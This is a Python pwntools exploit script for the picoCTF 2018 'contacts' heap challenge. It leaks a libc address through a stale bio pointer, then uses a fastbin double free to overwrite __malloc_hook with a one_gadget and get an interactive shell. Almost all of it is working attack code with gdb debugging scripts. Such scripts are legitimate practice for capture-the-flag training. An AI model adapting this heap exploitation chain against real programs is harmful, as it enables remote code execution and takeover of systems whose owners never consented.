#! /usr/bin/env python
#
from pwn import context, p64, u64, log, process, remote, args
from pwn import gdb, ELF
context.clear(arch='amd64', os='linux')


class Attack:
    def __init__(self, host, port, elf_name, libc_name, gdb_script=None):
        self.host, self.port = host, port
        self.elf_name, self.libc_name = elf_name, libc_name
        self.gdb_script = gdb_script

        self.elf = ELF(self.elf_name)
        self.libc = ELF(self.libc_name)

        self.p = None


    def get_process(self):
        p = None
        if args.REMOTE:
            p = remote(self.host, self.port)
        else:
            p = process('./%s' % self.elf_name)
            if args.GDB:
                gdb.attach(p.pid, self.gdb_script)
        return p


    def print_contacts(self, name):
        cmd = 'display'
        self.p.sendlineafter('\n> ', cmd)
        self.p.recvuntil(('%s - ' % (name)))
        leak = self.p.recv(6)  # at least 6 byte address on amd64 system
        leak = leak.ljust(8, '\x00')
        leak = u64(leak)
        return leak


    def create_contact(self, name):
        cmd = 'create %s' % name
        self.p.sendlineafter('\n> ', cmd)
        return name


    def delete_contact(self, name):
        cmd = 'delete %s' % name
        self.p.sendlineafter('> ', cmd)


    def set_bio(self, name, length, bio):
        cmd = 'bio %s' % name
        self.p.sendlineafter('> ', cmd)
        self.p.sendlineafter('be?\n', str(length))
        if bio is not None:
            if length == len(bio):
                self.p.sendafter('bio:\n', bio)
            else:
                self.p.sendlineafter('bio:\n', bio)


    def free_contact_bio(self, name):
        self.set_bio(name, 256, None)


    def exploit(self):
        elf = self.elf
        libc = self.libc
        libc.symbols['one_gadget'] = 0xf1147
        with self.get_process() as self.p:

            # -- stage 1 ---------------------------------------------------------------

            A = self.create_contact('AAAA')
            payload = 'A' * 8 + p64(elf.got['puts'])
            self.set_bio(A, 16, payload)
            # Only free contact->bio
            self.free_contact_bio(A)
            log.info("Now the free list has [A->bio]")
            B = self.create_contact('BBBB')
            log.info("B gets address of [A->bio]")
            log.info('Now the free list has [NULL]')
            log.info('No initialization, now B->bio point to &puts@got')
            log.info('Leaking puts address ...')
            ADDR_puts = self.print_contacts(B)

            libc.address = ADDR_puts - libc.symbols['puts']
            ADDR___malloc_hook = libc.symbols['__malloc_hook']
            ADDR_one_gadget = libc.symbols['one_gadget']
            log.info("puts          : %s", hex(ADDR_puts))
            log.info('libc          : %s', hex(libc.address))
            log.info('__malloc_hook : %s', hex(ADDR___malloc_hook))
            log.info('One gadget    : %s', hex(ADDR_one_gadget))

            # -- stage 2 ---------------------------------------------------------------

            # Fastbin attack
            # setting up
            # (we can only control malloc size for bio, so precreate as many contacts as needed)
            A = self.create_contact('A')
            B = self.create_contact('B')
            C = self.create_contact('C')
            D = self.create_contact('D')
            E = self.create_contact('E')
            F = self.create_contact('F')

            """
                set $m = ADDR___malloc_hook
                (gdb) x/8xg $m - 48
                0x7ffff7dd1ae0 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000
                0x7ffff7dd1af0 <_IO_wide_data_0+304>:   0x00007ffff7dd0260      0x0000000000000000
                0x7ffff7dd1b00 <__memalign_hook>:       0x00007ffff7a92e20      0x00007ffff7a92a00
                0x7ffff7dd1b10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
                (gdb) x/8xg $m - 0x23
                0x7ffff7dd1aed <_IO_wide_data_0+301>:   0xfff7dd0260000000      0x000000000000007f
                0x7ffff7dd1afd: 0xfff7a92e20000000      0xfff7a92a0000007f
                0x7ffff7dd1b0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
                0x7ffff7dd1b1d: 0x0100000000000000      0x0000000000000000
                => bytes need to write: 0x7ffff7dd1b10 - 0x7ffff7dd1afd = 0x13
            """
            # we can __malloc_chunk-0x23 as fake header, which would give a size of 0x7f
            OFFSET_hook_fakechunk = 0x23
            fchunk = ADDR___malloc_hook - OFFSET_hook_fakechunk
            log.info('Corrupting fastchunk list with fake chunk at: %s', hex(fchunk))
            # malloc(0x60) would create size of 0x70 (0x71 with inuse),
            # which is in the same bin as 0x7f
            msize = 0x60
            self.set_bio(A, msize, 'A' * msize) # alloc fastbin of size 0x60
            self.set_bio(B, msize, 'B' * msize) # alloc fastbin of size 0x60

            self.free_contact_bio(B) # free list has [B->bio]
            self.free_contact_bio(A) # free list has [A->bio, B->bio]
            self.free_contact_bio(B) # free list has [B->bio, A->bio, B->bio]

            # Fastbin returns B, overwrite B->next with fake chunk pointing above __malloc_hook
            payload = p64(fchunk)
            self.set_bio(C, msize, payload) # free list has [A->bio, B->bio]
            # Returns A
            self.set_bio(D, msize, '')
            # Returns B
            self.set_bio(E, msize, '')
            # Returns B->next or fake chunk above malloc hook
            # Overwrite __malloc_hook with one gadget of execv("/bin/sh")
            payload = '\x00' * (OFFSET_hook_fakechunk - 0x10) + p64(ADDR_one_gadget)
            self.set_bio(F, msize, payload)
            # This next call to malloc will invoke the function pointer __malloc_hook
            self.create_contact("win")

            self.p.clean()
            self.p.sendline('ls -la')
            self.p.interactive()

            # p.clean()
            # p.sendline('ls -la')
            # p.interactive()


if __name__ == "__main__":
    host, port = '2018shell2.picoctf.com', 40352
    elf_name, libc_name = 'contacts', 'libc.so.6'
    gdb_script = r"""
# source ~/.gdbinit-gef.py
# gef config context.enable false
b *(create_contact + 0x81)
b *(set_bio + 0x27)
b *(set_bio + 0xe0)
c

printf "--- contacts (after malloc) ------------------------\n"
x/8xg &contacts
set $con0=contacts
printf "--- heap mapping -----------------------------------\n"
x/32xg $con0 - 16
c
c
printf "--- contacts (after malloc) ------------------------\n"
x/8xg &contacts
printf "--- heap mapping (set_bio) -------------------------\n"
x/32xg $con0 - 16
c
printf "--- heap mapping (set_bio) (only free bio) ---------\n"
x/32xg $con0 - 16
c
c
printf "--- contacts (created 'BBBB') ----------------------\n"
x/8xg &contacts
printf "--- heap mapping -----------------------------------\n"
x/32xg $con0 - 16
"""
    attack = Attack(host, port, elf_name, libc_name, gdb_script)
    attack.exploit()
